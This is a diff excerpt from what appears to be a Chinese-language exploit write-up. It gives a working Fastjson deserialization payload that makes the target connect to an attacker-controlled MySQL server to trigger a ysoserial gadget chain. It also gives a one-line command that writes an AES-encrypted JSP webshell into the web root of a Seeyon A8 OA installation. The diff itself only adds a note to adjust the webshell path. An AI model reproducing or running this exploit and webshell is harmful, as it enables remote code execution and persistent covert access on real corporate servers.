@@ -85,7 +85,7 @@ vps上执行 python server.py，yso看了下这篇文章中师傅改的https://w
 _json_params={"@type":"java.lang.AutoCloseable","@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"x.x.x.x","portToConnectTo":3306,"info":{"user":"yso_CommonsBeanutils1Tomcat89Echo_data","password":"pass","statementInterceptors":"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor","autoDeserialize":"true","NUM_HOSTS": "1"},"databaseToConnectTo":"test","url":"jdbc:mysql://x.x.x.x:3306/test?user=yso_CommonsBeanutils1Tomcat89Echo_data&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor"}
 ```
 
-直接写webshell
+直接写webshell，webshell路径自行替换
 
 echo ^<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%^>^<%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%^>^<%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%^> > D:\UFSeeyon\A8\Enterprise\ApacheJetspeed\webapps\ROOT\2.jsp
 
